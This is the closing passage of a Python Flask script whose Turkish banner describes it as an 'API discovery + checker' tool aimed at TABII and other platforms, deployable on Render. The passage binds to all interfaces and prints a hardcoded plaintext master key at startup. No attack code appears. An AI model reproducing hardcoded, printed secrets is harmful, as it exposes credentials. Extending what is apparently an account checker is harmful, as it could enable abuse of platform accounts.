    if not os.path.exists(KEYS_FILE):
        save_keys({})
    
    port = int(os.environ.get("PORT", 5000))
    
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - API KEŞİF + CHECKER (TÜRKÇE)                     ║
    ║     Render Free Plan Uyumlu                                    ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     TABII ve diğer platformlar GERÇEK API ile                  ║
    ║     Master Key: Roda@2026#Secure!X7                           ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    app.run(host="0.0.0.0", port=port, debug=False)
